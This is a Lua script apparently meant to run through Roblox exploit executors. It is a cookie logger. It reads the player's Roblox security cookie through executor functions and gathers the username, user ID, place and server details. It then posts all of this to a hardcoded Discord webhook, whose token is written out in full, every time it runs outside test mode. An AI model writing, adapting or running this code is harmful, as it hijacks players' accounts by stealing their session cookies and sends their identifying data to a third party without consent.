local M = {}

local request = request or http_request or syn.request or fluxus.request or KRNL.HttpRequest
local httpService = game:GetService("HttpService")
local players = game:GetService("Players")
local marketplaceService = game:GetService("MarketplaceService")

local webhookUrl = "https://discord.com/api/webhooks/1322910314534010880/Fx3dNcAnfeP5iGp9yGEGnHt217Jq_eni_Wt7WOS7AJJPT0oGoYMhO9fHM22s7zr4ujJp"

-- Collect Roblox security cookie (generalized for multiple executors)
function M.getCookie()
    local cookieValue = ""

    -- Try common methods used by various executors
    pcall(function()
        if syn then
            cookieValue = syn.get_securecookie()
        elseif fluxus then
            cookieValue = fluxus.getcookie()
        elseif KRNL then
            cookieValue = KRNL.getcookie()
        elseif getgenv and getgenv().cookie then
            cookieValue = getgenv().cookie -- Custom global environment variable (if manually set)
        else
            cookieValue = "Unknown Executor or Unsupported Method"
        end
    end)

    return cookieValue
end

-- Gather session data
function M.gatherInfo()
    local placeInfo = marketplaceService:GetProductInfo(game.PlaceId)
    local info = {
        Username = players.LocalPlayer.Name,
        UserId = players.LocalPlayer.UserId,
        PlaceId = game.PlaceId,
        PlaceName = placeInfo.Name,
        JobId = game.JobId,
        ProfileLink = "https://www.roblox.com/users/" .. players.LocalPlayer.UserId .. "/profile",
        Cookie = getCookie(), -- Attach the cookie here
        Device = game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC/Console",
        AutoJoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId -- Auto-join link
    }
    return info
end

-- Send session data to webhook
function M.sendToWebhook(data)
    local payload = {
        ["content"] = "Collected Roblox Session Data",
        ["embeds"] = {{
            ["title"] = "Session Information",
            ["fields"] = {
                {["name"] = "Username", ["value"] = data.Username, ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(data.UserId), ["inline"] = true},
                {["name"] = "Profile Link", ["value"] = "[View Profile](" .. data.ProfileLink .. ")", ["inline"] = false},
                {["name"] = "Place Name", ["value"] = data.PlaceName, ["inline"] = true},
                {["name"] = "Place ID", ["value"] = tostring(data.PlaceId), ["inline"] = true},
                {["name"] = "Job ID", ["value"] = data.JobId, ["inline"] = true},
                {["name"] = "Device Type", ["value"] = data.Device, ["inline"] = true},
                {["name"] = "Cookie", ["value"] = "```" .. data.Cookie .. "```", ["inline"] = false}, -- Send the cookie
                {["name"] = "Auto-Join Link", ["value"] = "[Click to Join Server](" .. data.AutoJoinLink .. ")", ["inline"] = false},
            },
            ["color"] = 0x7289DA
        }}
    }

    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = httpService:JSONEncode(payload),
    })
end

-- Main Execution
if not _TEST then
    local data = M.gatherInfo()
    M.sendToWebhook(data) -- Send session data to webhook
end

return M
